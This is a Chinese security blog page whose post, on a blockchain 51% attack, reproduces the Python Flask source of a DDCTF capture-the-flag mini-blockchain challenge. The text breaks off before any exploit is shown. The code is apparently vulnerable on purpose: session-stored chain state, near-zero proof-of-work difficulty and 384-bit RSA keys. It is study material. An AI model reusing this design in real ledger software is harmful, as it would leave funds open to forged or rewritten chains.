<!DOCTYPE html>



  


<html class="theme-next muse use-motion" lang="zh-Hans">
<head>
  <meta charset="UTF-8"/>
<meta http-equiv="X-UA-Compatible" content="IE=edge" />
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
<meta name="theme-color" content="#222">









<meta http-equiv="Cache-Control" content="no-transform" />
<meta http-equiv="Cache-Control" content="no-siteapp" />
















  
  
  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />







<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />

<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />


  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">


  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">


  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">


  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">





  <meta name="keywords" content="Hexo, NexT" />










<meta property="og:type" content="website">
<meta property="og:title" content="b1acktea&#39;s">
<meta property="og:url" content="http://yoursite.com/index.html">
<meta property="og:site_name" content="b1acktea&#39;s">
<meta property="og:locale" content="zh-Hans">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="b1acktea&#39;s">



<script type="text/javascript" id="hexo.configurations">
  var NexT = window.NexT || {};
  var CONFIG = {
    root: '/',
    scheme: 'Muse',
    version: '5.1.4',
    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
    fancybox: true,
    tabs: true,
    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
    duoshuo: {
      userId: '0',
      author: '博主'
    },
    algolia: {
      applicationID: '',
      apiKey: '',
      indexName: '',
      hits: {"per_page":10},
      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
    }
  };
</script>



  <link rel="canonical" href="http://yoursite.com/"/>





  <title>b1acktea's</title>
  








</head>

<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">

  
  
    
  

  <div class="container sidebar-position-left 
  page-home">
    <div class="headband"></div>

    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-wrapper">
  <div class="site-meta ">
    

    <div class="custom-logo-site-title">
      <a href="/"  class="brand" rel="start">
        <span class="logo-line-before"><i></i></span>
        <span class="site-title">b1acktea's</span>
        <span class="logo-line-after"><i></i></span>
      </a>
    </div>
      
        <p class="site-subtitle"></p>
      
  </div>

  <div class="site-nav-toggle">
    <button>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
    </button>
  </div>
</div>

<nav class="site-nav">
  

  
    <ul id="menu" class="menu">
      
        
        <li class="menu-item menu-item-home">
          <a href="/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
            
            首页
          </a>
        </li>
      
        
        <li class="menu-item menu-item-archives">
          <a href="/archives/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
            
            归档
          </a>
        </li>
      

      
    </ul>
  

  
</nav>



 </div>
    </header>

    <main id="main" class="main">
      <div class="main-inner">
        <div class="content-wrap">
          <div id="content" class="content">
            
  <section id="posts" class="posts-expand">
    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/05/07/miniblockchain/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="b1acktea">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="b1acktea's">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2018/05/07/miniblockchain/" itemprop="url">区块链51%攻击——mini blockchain</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-05-07T10:06:51+08:00">
                2018-05-07
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/区块链安全/" itemprop="url" rel="index">
                    <span itemprop="name">区块链安全</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h3 id="源代码"><a href="#源代码" class="headerlink" title="#源代码"></a><strong>#源代码</strong></h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- encoding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># written in python 2.7</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> hashlib, json, rsa, uuid</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, session, redirect, url_for, escape, request</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.secret_key = <span class="string">'*********************'</span></span><br><span class="line">url_prefix = <span class="string">'/b942f830cf97e'</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">FLAG</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">'Here is your flag: DDCTF&#123;******************&#125;'</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hash</span><span class="params">(x)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> hashlib.sha256(hashlib.md5(x).digest()).hexdigest()</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hash_reducer</span><span class="params">(x, y)</span>:</span><span class="comment">#迭代hash</span></span><br><span class="line">    <span class="keyword">return</span> hash(hash(x)+hash(y))</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">has_attrs</span><span class="params">(d, attrs)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> type(d) != type(&#123;&#125;): <span class="keyword">raise</span> Exception(<span class="string">"Input should be a dict/JSON"</span>)</span><br><span class="line">    <span class="keyword">for</span> attr <span class="keyword">in</span> attrs:</span><br><span class="line">        <span class="keyword">if</span> attr <span class="keyword">not</span> <span class="keyword">in</span> d:</span><br><span class="line">            <span class="keyword">raise</span> Exception(<span class="string">"&#123;&#125; should be presented in the input"</span>.format(attr))</span><br><span class="line"></span><br><span class="line">EMPTY_HASH = <span class="string">'0'</span>*<span class="number">64</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">addr_to_pubkey</span><span class="params">(address)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> rsa.PublicKey(int(address, <span class="number">16</span>), <span class="number">65537</span>)</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pubkey_to_address</span><span class="params">(pubkey)</span>:</span></span><br><span class="line">    <span class="keyword">assert</span> pubkey.e == <span class="number">65537</span></span><br><span class="line">    hexed = hex(pubkey.n)</span><br><span class="line">    <span class="keyword">if</span> hexed.endswith(<span class="string">'L'</span>): hexed = hexed[:<span class="number">-1</span>]</span><br><span class="line">    <span class="keyword">if</span> hexed.startswith(<span class="string">'0x'</span>): hexed = hexed[<span class="number">2</span>:]</span><br><span class="line">    <span class="keyword">return</span> hexed</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gen_addr_key_pair</span><span class="params">()</span>:</span></span><br><span class="line">    pubkey, privkey = rsa.newkeys(<span class="number">384</span>)</span><br><span class="line">    <span class="keyword">return</span> pubkey_to_address(pubkey), privkey</span><br><span class="line"></span><br><span class="line">bank_address, bank_privkey = gen_addr_key_pair()</span><br><span class="line">hacker_address, hacker_privkey = gen_addr_key_pair()</span><br><span class="line">shop_address, shop_privkey = gen_addr_key_pair()</span><br><span class="line">shop_wallet_address, shop_wallet_privkey = gen_addr_key_pair()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sign_input_utxo</span><span class="params">(input_utxo_id, privkey)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> rsa.sign(input_utxo_id, privkey, <span class="string">'SHA-1'</span>).encode(<span class="string">'hex'</span>)</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hash_utxo</span><span class="params">(utxo)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> reduce(hash_reducer, [utxo[<span class="string">'id'</span>], utxo[<span class="string">'addr'</span>], str(utxo[<span class="string">'amount'</span>])])</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create_output_utxo</span><span class="params">(addr_to, amount)</span>:</span></span><br><span class="line">    utxo = &#123;<span class="string">'id'</span>: str(uuid.uuid4()), <span class="string">'addr'</span>: addr_to, <span class="string">'amount'</span>: amount&#125;</span><br><span class="line">    utxo[<span class="string">'hash'</span>] = hash_utxo(utxo)</span><br><span class="line">    <span class="keyword">return</span> utxo</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hash_tx</span><span class="params">(tx)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> reduce(hash_reducer, [</span><br><span class="line">        reduce(hash_reducer, tx[<span class="string">'input'</span>], EMPTY_HASH),</span><br><span class="line">        reduce(hash_reducer, [utxo[<span class="string">'hash'</span>] <span class="keyword">for</span> utxo <span class="keyword">in</span> tx[<span class="string">'output'</span>]], EMPTY_HASH)</span><br><span class="line">    ])</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create_tx</span><span class="params">(input_utxo_ids, output_utxo, privkey_from=None)</span>:</span></span><br><span class="line">    tx = &#123;<span class="string">'input'</span>: input_utxo_ids, <span class="string">'signature'</span>: [sign_input_utxo(id, privkey_from) <span class="keyword">for</span> id <span class="keyword">in</span> input_utxo_ids], <span class="string">'output'</span>: output_utxo&#125;</span><br><span class="line">    tx[<span class="string">'hash'</span>] = hash_tx(tx)</span><br><span class="line">    <span class="keyword">return</span> tx</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hash_block</span><span class="params">(block)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> reduce(hash_reducer, [block[<span class="string">'prev'</span>], block[<span class="string">'nonce'</span>], reduce(hash_reducer, [tx[<span class="string">'hash'</span>] <span class="keyword">for</span> tx <span class="keyword">in</span> block[<span class="string">'transactions'</span>]], EMPTY_HASH)])</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create_block</span><span class="params">(prev_block_hash, nonce_str, transactions)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> type(prev_block_hash) != type(<span class="string">''</span>): <span class="keyword">raise</span> Exception(<span class="string">'prev_block_hash should be hex-encoded hash value'</span>)</span><br><span class="line">    nonce = str(nonce_str)</span><br><span class="line">    <span class="keyword">if</span> len(nonce) &gt; <span class="number">128</span>: <span class="keyword">raise</span> Exception(<span class="string">'the nonce is too long'</span>)</span><br><span class="line">    block = &#123;<span class="string">'prev'</span>: prev_block_hash, <span class="string">'nonce'</span>: nonce, <span class="string">'transactions'</span>: transactions&#125;</span><br><span class="line">    block[<span class="string">'hash'</span>] = hash_block(block)<span class="comment">#本块hash</span></span><br><span class="line">    <span class="keyword">return</span> block</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">find_blockchain_tail</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> max(session[<span class="string">'blocks'</span>].values(), key=<span class="keyword">lambda</span> block: block[<span class="string">'height'</span>])</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">calculate_utxo</span><span class="params">(blockchain_tail)</span>:</span></span><br><span class="line">    curr_block = blockchain_tail</span><br><span class="line">    blockchain = [curr_block]</span><br><span class="line">    <span class="keyword">while</span> curr_block[<span class="string">'hash'</span>] != session[<span class="string">'genesis_block_hash'</span>]:</span><br><span class="line">        curr_block = session[<span class="string">'blocks'</span>][curr_block[<span class="string">'prev'</span>]]</span><br><span class="line">        blockchain.append(curr_block)</span><br><span class="line">    blockchain = blockchain[::<span class="number">-1</span>]</span><br><span class="line">    utxos = &#123;&#125;</span><br><span class="line">    <span class="keyword">for</span> block <span class="keyword">in</span> blockchain:</span><br><span class="line">        <span class="keyword">for</span> tx <span class="keyword">in</span> block[<span class="string">'transactions'</span>]:</span><br><span class="line">            <span class="keyword">for</span> input_utxo_id <span class="keyword">in</span> tx[<span class="string">'input'</span>]:</span><br><span class="line">                <span class="keyword">del</span> utxos[input_utxo_id]</span><br><span class="line">            <span class="keyword">for</span> utxo <span class="keyword">in</span> tx[<span class="string">'output'</span>]:</span><br><span class="line">                utxos[utxo[<span class="string">'id'</span>]] = utxo</span><br><span class="line">    <span class="keyword">return</span> utxos</span><br><span class="line">        </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">calculate_balance</span><span class="params">(utxos)</span>:</span></span><br><span class="line">    balance = &#123;bank_address: <span class="number">0</span>, hacker_address: <span class="number">0</span>, shop_address: <span class="number">0</span>&#125;</span><br><span class="line">    <span class="keyword">for</span> utxo <span class="keyword">in</span> utxos.values():</span><br><span class="line">        <span class="keyword">if</span> utxo[<span class="string">'addr'</span>] <span class="keyword">not</span> <span class="keyword">in</span> balance:</span><br><span class="line">            balance[utxo[<span class="string">'addr'</span>]] = <span class="number">0</span></span><br><span class="line">        balance[utxo[<span class="string">'addr'</span>]] += utxo[<span class="string">'amount'</span>]</span><br><span class="line">    <span class="keyword">return</span> balance</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">verify_utxo_signature</span><span class="params">(address, utxo_id, signature)</span>:</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">return</span> rsa.verify(utxo_id, signature.decode(<span class="string">'hex'</span>), addr_to_pubkey(address))</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">False</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">append_block</span><span class="params">(block, difficulty=int<span class="params">(<span class="string">'f'</span>*<span class="number">64</span>, <span class="number">16</span>)</span>)</span>:</span></span><br><span class="line">    has_attrs(block, [<span class="string">'prev'</span>, <span class="string">'nonce'</span>, <span class="string">'transactions'</span>]) <span class="comment">#判断三个属性是否在block的数据中</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> type(block[<span class="string">'prev'</span>]) == type(<span class="string">u''</span>): block[<span class="string">'prev'</span>] = str(block[<span class="string">'prev'</span>])</span><br><span class="line">    <span class="keyword">if</span> type(block[<span class="string">'nonce'</span>]) == type(<span class="string">u''</span>): block[<span class="string">'nonce'</span>] = str(block[<span class="string">'nonce'</span>])<span class="comment">#prev和nonce是unicode</span></span><br><span class="line">    <span class="keyword">if</span> block[<span class="string">'prev'</span>] <span class="keyword">not</span> <span class="keyword">in</span> session[<span class="string">'blocks'</span>]: <span class="keyword">raise</span> Exception(<span class="string">"unknown parent block"</span>)<span class="comment">#prev的hash必须是已存在的块的</span></span><br><span class="line">    tail = session[<span class="string">'blocks'</span>][block[<span class="string">'prev'</span>]]</span><br><span class="line">    utxos = calculate_utxo(tail)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> type(block[<span class="string">'transactions'</span>]) != type([]): <span class="keyword">raise</span> Exception(<span class="string">'Please put a transaction array in the block'</span>)<span class="comment">#transactions必须是[]格式</span></span><br><span class="line">    new_utxo_ids = set()</span><br><span class="line">    <span class="keyword">for</span> tx <span class="keyword">in</span> block[<span class="string">'transactions'</span>]:</span><br><span class="line">        has_attrs(tx, [<span class="string">'input'</span>, <span class="string">'output'</span>, <span class="string">'signature'</span>])</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">for</span> utxo <span class="keyword">in</span> tx[<span class="string">'output'</span>]:</span><br><span class="line">            <span class="comment">#判断是否有属性，判断格式，判断每笔交易的id是否重复</span></span><br><span class="line">            has_attrs(utxo, [<span class="string">'amount'</span>, <span class="string">'addr'</span>, <span class="string">'id'</span>])</span><br><span class="line">            <span class="keyword">if</span> type(utxo[<span class="string">'id'</span>]) == type(<span class="string">u''</span>): utxo[<span class="string">'id'</span>] = str(utxo[<span class="string">'id'</span>])</span><br><span class="line">            <span class="keyword">if</span> type(utxo[<span class="string">'addr'</span>]) == type(<span class="string">u''</span>): utxo[<span class="string">'addr'</span>] = str(utxo[<span class="string">'addr'</span>])</span><br><span class="line">            <span class="keyword">if</span> type(utxo[<span class="string">'id'</span>]) != type(<span class="string">''</span>): <span class="keyword">raise</span> Exception(<span class="string">"unknown type of id of output utxo"</span>)</span><br><span class="line">            <span class="keyword">if</span> utxo[<span class="string">'id'</span>] <span class="keyword">in</span> new_utxo_ids: <span class="keyword">raise</span> Exception(<span class="string">"output utxo of same id(&#123;&#125;) already exists."</span>.format(utxo[<span class="string">'id'</span>]))</span><br><span class="line">            new_utxo_ids.add(utxo[<span class="string">'id'</span>])</span><br><span class="line">            <span class="keyword">if</span> type(utxo[<span class="string">'amount'</span>]) != type(<span class="number">1</span>): <span class="keyword">raise</span> Exception(<span class="string">"unknown type of amount of output utxo"</span>)</span><br><span class="line">            <span class="keyword">if</span> utxo[<span class="string">'amount'</span>] &lt;= <span class="number">0</span>: <span class="keyword">raise</span> Exception(<span class="string">"invalid amount of output utxo"</span>)</span><br><span class="line">            <span class="keyword">if</span> type(utxo[<span class="string">'addr'</span>]) != type(<span class="string">''</span>): <span class="keyword">raise</span> Exception(<span class="string">"unknown type of address of output utxo"</span>)</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                addr_to_pubkey(utxo[<span class="string">'addr'</span>])</span><br><span class="line">            <span class="keyword">except</span>:</span><br><span class="line">                <span class="keyword">raise</span> Exception(<span class="string">"invalid type of address(&#123;&#125;)"</span>.format(utxo[<span class="string">'addr'</span>]))</span><br><span class="line">            utxo[<span class="string">'hash'</span>] = hash_utxo(utxo)</span><br><span class="line">        tot_output = sum([utxo[<span class="string">'amount'</span>] <span class="keyword">for</span> utxo <span class="keyword">in</span> tx[<span class="string">'output'</span>]])</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> type(tx[<span class="string">'input'</span>]) != type([]): <span class="keyword">raise</span> Exception(<span class="string">"type of input utxo ids in tx should be array"</span>)</span><br><span class="line">        <span class="keyword">if</span> type(tx[<span class="string">'signature'</span>]) != type([]): <span class="keyword">raise</span> Exception(<span class="string">"type of input utxo signatures in tx should be array"</span>)</span><br><span class="line">        <span class="keyword">if</span> len(tx[<span class="string">'input'</span>]) != len(tx[<span class="string">'signature'</span>]): <span class="keyword">raise</span> Exception(<span class="string">"lengths of arrays of ids and signatures of input utxos should be the same"</span>)</span><br><span class="line">        tot_input = <span class="number">0</span></span><br><span class="line">        tx[<span class="string">'input'</span>] = [str(i) <span class="keyword">if</span> type(i) == type(<span class="string">u''</span>) <span class="keyword">else</span> i <span class="keyword">for</span> i <span class="keyword">in</span> tx[<span class="string">'input'</span>]]</span><br><span class="line">        tx[<span class="string">'signature'</span>] = [str(i) <span class="keyword">if</span> type(i) == type(<span class="string">u''</span>) <span class="keyword">else</span> i <span class="keyword">for</span> i <span class="keyword">in</span> tx[<span class="string">'signature'</span>]]</span><br><span class="line">        <span class="keyword">for</span> utxo_id, signature <span class="keyword">in</span> zip(tx[<span class="string">'input'</span>], tx[<span class="string">'signature'</span>]):</span><br><span class="line">            <span class="keyword">if</span> type(utxo_id) != type(<span class="string">''</span>): <span class="keyword">raise</span> Exception(<span class="string">"unknown type of id of input utxo"</span>)</span><br><span class="line">            <span class="keyword">if</span> utxo_id <span class="keyword">not</span> <span class="keyword">in</span> utxos: <span class="keyword">raise</span> Exception(<span class="string">"invalid id of input utxo. Input utxo(&#123;&#125;) does not exist or it has been consumed."</span>.format(utxo_id))</span><br><span class="line">            utxo = utxos[utxo_id]</span><br><span class="line">            <span class="keyword">if</span> type(signature) != type(<span class="string">''</span>): <span class="keyword">raise</span> Exception(<span class="string">"unknown type of signature of input utxo"</span>)</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> verify_utxo_signature(utxo[<span class="string">'addr'</span>], utxo_id, signature):</span><br><span class="line">                <span class="keyword">raise</span> Exception(<span class="string">"Signature of input utxo is not valid. You are not the owner of this input utxo(&#123;&#125;)!"</span>.format(utxo_id))</span><br><span class="line">            tot_input += utxo[<span class="string">'amount'</span>]</span><br><span class="line">            <span class="keyword">del</span> utxos[utxo_id]</span><br><span class="line">        <span class="comment">#判断账单的入和出是否平衡</span></span><br><span class="line">        <span class="keyword">if</span> tot_output &gt; tot_input:</span><br><span class="line">            <span class="keyword">raise</span> Exception(<span class="string">"You don't have enough amount of DDCoins in the input utxo! &#123;&#125;/&#123;&#125;"</span>.format(tot_input, tot_output))</span><br><span class="line">        tx[<span class="string">'hash'</span>] = hash_tx(tx)</span><br><span class="line">    </span><br><span class="line">    block = create_block(block[<span class="string">'prev'</span>], block[<span class="string">'nonce'</span>], block[<span class="string">'transactions'</span>])</span><br><span class="line">    <span class="comment">#判断新block的难度是否符合要求</span></span><br><span class="line">    block_hash = int(block[<span class="string">'hash'</span>], <span class="number">16</span>)</span><br><span class="line">    <span class="keyword">if</span> block_hash &gt; difficulty: <span class="keyword">raise</span> Exception(<span class="string">'Please provide a valid Proof-of-Work'</span>)</span><br><span class="line">    block[<span class="string">'height'</span>] = tail[<span class="string">'height'</span>]+<span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> len(session[<span class="string">'blocks'</span>]) &gt; <span class="number">50</span>: <span class="keyword">raise</span> Exception(<span class="string">'The blockchain is too long. Use ./reset to reset the blockchain'</span>)</span><br><span class="line">    <span class="keyword">if</span> block[<span class="string">'hash'</span>] <span class="keyword">in</span> session[<span class="string">'blocks'</span>]: <span class="keyword">raise</span> Exception(<span class="string">'A same block is already in the blockchain'</span>)</span><br><span class="line">    session[<span class="string">'blocks'</span>][block[<span class="string">'hash'</span>]] = block</span><br><span class="line">    session.modified = <span class="keyword">True</span></span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">init</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">'blocks'</span> <span class="keyword">not</span> <span class="keyword">in</span> session:</span><br><span class="line">        session[<span class="string">'blocks'</span>] = &#123;&#125;</span><br><span class="line">        session[<span class="string">'your_diamonds'</span>] = <span class="number">0</span></span><br><span class="line">    </span><br><span class="line">        <span class="comment"># First, the bank issued some 